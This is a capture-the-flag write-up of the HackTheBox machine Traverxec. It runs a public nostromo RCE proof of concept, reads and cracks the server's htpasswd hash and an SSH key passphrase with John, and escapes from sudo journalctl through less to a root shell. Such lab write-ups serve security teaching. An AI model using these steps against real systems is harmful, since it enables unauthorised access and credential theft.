---
Title: HackTheBox Traverxec
Date: 2020-01-04
Category: Challenges
Status: published
---

Traverxec is an interesting box, mainly because the HackTheBox team rated it as easy while the community disagreed and voted it to medium difficulty. It involved a funky privilege escalation that I had not seen before. Let's see how it's done! Our first nmap scan does not return exciting results:

```sh
$ nmap -sS -sC -oN traverxec.nmap -v 10.10.10.165
# Nmap 7.80 scan initiated Mon Dec  9 13:49:03 2019 as: nmap -sS -sC -oN traverxec.nmap -v 10.10.10.165
Nmap scan report for 10.10.10.165
Host is up (0.11s latency).
Not shown: 998 filtered ports
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey:
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http
|_http-favicon: Unknown favicon MD5: FED84E16B6CCFE88EE7FFAAE5DFEFD34
| http-methods:
|_  Supported Methods: GET HEAD POST
|_http-title: TRAVERXEC

Read data files from: /usr/bin/../share/nmap
# Nmap done at Mon Dec  9 13:49:30 2019 -- 1 IP address (1 host up) scanned in 26.97 seconds
```

On port 80, we see a portfolio website. Nothing exciting seems to be hidden here. We have some static images, a Javascript gallery, a bootstrap template, and a bit of glue in between. The contact form initially seemed interesting, but on closer inspection, we simply perform a GET request to an empty file:

```html
<form class="contact-form php-mail-form" role="form" action="empty.html" method="GET">
```

There are also no `robots.txt` or `.htaccess` files. However, performing some requests to the server and inspecting the response headers, we can see that the server version leaks: `nostromo 1.9.6`. Looking for exploits, we find a remote code execution vulnerability: https://www.exploit-db.com/exploits/47837. Using the attached proof-of-concept code (like the script kiddies we are), we can explore our privileges:

```sh
# ./rce.py 10.10.10.165 80 whoami

HTTP/1.1 200 OK
Date: Sat, 04 Jan 2020 12:06:43 GMT
Server: nostromo 1.9.6
Connection: close

www-data
```

Reading up on Nostromo as a server, we discover the configuration directory and can extract an htpasswd file:

```
# ./rce.py 10.10.10.165 80 'ls /var/nostromo/conf/'

- .htpasswd file found /var/nostromo/conf/.htpasswd david:$1$e7NfNpNi$A6nCwOTqrNR2oDuIKirRZ/
```

Naturally, we crack it with JohnTheRipper and obtain the password for the user `david`:

```sh
# john --wordlist=/usr/share/wordlists/rockyou.txt htpasswd-david.hash
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Nowonly4me       (?)
1g 0:00:01:34 DONE (2020-01-04 13:12) 0.01063g/s 112524p/s 112524c/s 112524C/s Noyoudo..Nous4=5
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Another interesting finding when browsing the file system is a cron job apparently backing up sensitive credential files:

```sh
# cat /etc/cron.daily/passwd
#!/bin/sh

cd /var/backups || exit 0

for FILE in passwd group shadow gshadow; do
        test -f /etc/$FILE              || continue
        cmp -s $FILE.bak /etc/$FILE     && continue
        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
done
```

The files are visible in the backup location, but we don't have read permissions on the juicy files:

```sh
$ ls -al /var/backups
total 484
drwxr-xr-x  2 root root     4096 Jan  4 06:25 .
drwxr-xr-x 12 root root     4096 Oct 25 14:43 ..
-rw-r--r--  1 root root    40960 Nov 12 06:25 alternatives.tar.0
-rw-r--r--  1 root root     7665 Oct 25 15:30 apt.extended_states.0
-rw-r--r--  1 root root      186 Oct 25 14:34 dpkg.diversions.0
-rw-r--r--  1 root root      126 Oct 25 14:34 dpkg.diversions.1.gz
-rw-r--r--  1 root root      100 Oct 25 14:20 dpkg.statoverride.0
-rw-r--r--  1 root root      120 Oct 25 14:20 dpkg.statoverride.1.gz
-rw-r--r--  1 root root   314222 Oct 25 15:30 dpkg.status.0
-rw-r--r--  1 root root    87664 Oct 25 15:30 dpkg.status.1.gz
-rw-------  1 root root      708 Oct 25 14:34 group.bak
-rw-------  1 root shadow    597 Oct 25 14:34 gshadow.bak
-rw-------  1 root root     1395 Oct 25 14:34 passwd.bak
-rw-------  1 root shadow    940 Oct 27 04:56 shadow.bak
```

Tracing back to Nostromo from this slight tangent, we can see that the server has a [home directory feature](https://www.gsp.com/cgi-bin/man.cgi?section=8&topic=nhttpd), meaning that we may be able to leak `david`'s home contents:

```sh
# cat conf/nhttpd.conf
# MAIN [MANDATORY]

servername              traverxec.htb
serverlisten            *
serveradmin             david@traverxec.htb
serverroot              /var/nostromo
servermimes             conf/mimes
docroot                 /var/nostromo/htdocs
docindex                index.html

# LOGS [OPTIONAL]

logpid                  logs/nhttpd.pid

# SETUID [RECOMMENDED]

user                    www-data

# BASIC AUTHENTICATION [OPTIONAL]

htaccess                .htaccess
htpasswd                /var/nostromo/conf/.htpasswd

# ALIASES [OPTIONAL]

/icons                  /var/nostromo/icons

# HOMEDIRS [OPTIONAL]

homedirs                /home
homedirs_public         public_www
```

And indeed, with the already cracked password, we can access David's protected area at `http://10.10.10.165/~david/protected-file-area/`. In there, we find his backed up password-protected SSH keys, however. So we crack them with John again:

```sh
# /usr/share/john/ssh2john.py id_rsa > id_rsa.john
# john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
hunter           (id_rsa)
1g 0:00:00:07 90.25% (ETA: 14:57:31) 0.1420g/s 1849Kp/s 1849Kc/s 1849KC/s 1defaolur*..1deep4ife
Session aborted
```

With SSH access as `david`, we can secure the user flag in their home directory. Additionally, we also find a server
monitoring script in his home:

```
# cat bin/server-stats.sh
#!/bin/bash

cat /home/david/bin/server-stats.head
echo "Load: `/usr/bin/uptime`"
echo " "
echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
echo " "
echo "Last 5 journal log lines:"
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
```

Note the last line, which performs a `sudo` call on `journalctl` to fetch the Nostromo logs. We can leverage a whitelisted `journalctl` for privilege escalation by leveraging sudo access to a pager application such as less. The command `sudo journalctl -n5 -unostromo.service` works, but it's bound to five lines of output. So we simply resize our terminal to a single line. This will guarantee us getting dropped into `less`. From there, we merely execute `!/bin/bash` in its command prompt, and we are dropped into a root shell, allowing us to gain access to the root flag.
